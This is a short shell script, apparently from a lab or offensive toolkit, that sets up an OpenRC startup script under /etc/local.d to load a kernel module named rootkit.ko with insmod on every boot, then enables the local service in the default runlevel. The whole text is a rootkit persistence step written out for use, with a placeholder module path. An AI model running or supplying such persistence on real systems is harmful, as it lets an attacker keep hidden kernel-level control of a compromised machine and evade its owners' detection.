echo "#!/bin/sh" > /etc/local.d/my_startup.start

echo "insmod /111111111111111111111111111/rootkit.ko" >> /etc/local.d/my_startup.start

chmod +x /etc/local.d/my_startup.start

#Adds the local service to the default runlevel
rc-update add local default

